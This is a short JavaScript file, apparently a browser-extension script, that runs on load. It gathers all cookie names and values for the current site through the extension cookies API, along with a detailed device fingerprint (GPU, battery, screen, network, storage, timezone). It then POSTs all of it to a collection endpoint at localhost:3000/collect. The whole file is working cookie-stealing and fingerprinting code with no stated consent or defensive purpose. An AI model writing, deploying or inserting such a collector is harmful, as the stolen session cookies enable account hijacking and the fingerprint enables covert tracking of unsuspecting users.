async function collectData() {
  const timestamp = new Date().toISOString();
  const domain = location.hostname || window.location.hostname || null;

  let cookieList = [];
  try {
    if (typeof chrome !== "undefined" && chrome.cookies) {
      cookieList = await new Promise(resolve =>
        chrome.cookies.getAll({ domain }, resolve)
      );
    } else if (typeof browser !== "undefined" && browser.cookies) {
      cookieList = await browser.cookies.getAll({ domain });
    }
  } catch (err) {
    cookieList = [];
  }

  const ua = navigator.userAgent || null;
  const platform = navigator.platform || null;
  const language = navigator.language || null;
  const screen_width = screen.width || null;
  const screen_height = screen.height || null;
  const color_depth = screen.colorDepth || null;
  const device_memory = navigator.deviceMemory || null;
  const hardware_concurrency = navigator.hardwareConcurrency || null;

  let timezone = null;
  try {
    timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  } catch (e) {
    timezone = null;
  }

  const browser_version = ua || null;
  const vendor = navigator.vendor || null;

  let gpu_vendor = null;
  let gpu_renderer = null;
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (gl) {
      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
      gpu_vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null;
      gpu_renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null;
    }
  } catch (e) {
    gpu_vendor = null;
    gpu_renderer = null;
  }

  let battery_charging = null;
  let battery_level = null;
  let battery_charging_time = null;
  let battery_discharging_time = null;
  try {
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      battery_charging = battery.charging;
      battery_level = battery.level;
      battery_charging_time = battery.chargingTime;
      battery_discharging_time = battery.dischargingTime;
    }
  } catch (e) {}

  let online = navigator.onLine || null;
  let connection_type = null;
  let downlink = null;
  let rtt = null;
  try {
    if (navigator.connection) {
      connection_type = navigator.connection.effectiveType || null;
      downlink = navigator.connection.downlink || null;
      rtt = navigator.connection.rtt || null;
    }
  } catch (e) {}

  let storage_quota = null;
  let storage_usage = null;
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const { quota, usage } = await navigator.storage.estimate();
      storage_quota = quota || null;
      storage_usage = usage || null;
    }
  } catch (e) {}

  const processedCookies = cookieList.map(c => ({
    name: c.name,
    value: c.value
  }));

  const payload = {
    timestamp,
    domain,
    cookies: processedCookies,
    user_agent: ua,
    platform,
    language,
    screen_width,
    screen_height,
    color_depth,
    device_memory,
    hardware_concurrency,
    timezone,
    browser_version,
    vendor,
    gpu_vendor,
    gpu_renderer,
    battery_charging,
    battery_level,
    battery_charging_time,
    battery_discharging_time,
    online,
    connection_type,
    downlink,
    rtt,
    storage_quota,
    storage_usage
  };

  try {
    await fetch("http://localhost:3000/collect", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  } catch (err) {
    console.error("Send error", err);
  }
}

collectData();
